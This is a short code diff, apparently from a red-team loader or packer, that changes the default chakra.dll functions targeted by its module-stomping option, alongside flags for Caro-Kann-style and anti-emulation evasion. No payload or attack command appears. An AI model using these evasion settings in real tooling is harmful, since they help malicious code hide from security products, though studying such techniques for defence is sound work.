@@ -350,8 +350,8 @@ var
     carokann: bool = false
     stomb: bool = false
     stombDll: string = "chakra.dll"
-    stombFunc: string = "MemProtectHeapUnprotectCurrentThread"
-    stombFunc2: string = "DllCanUnloadNow"
+    stombFunc: string = "JsCreateThreadService"
+    stombFunc2: string = "MemProtectHeapUnprotectCurrentThread"
     restore: bool = false
     noAntiEmulate: bool = false
 
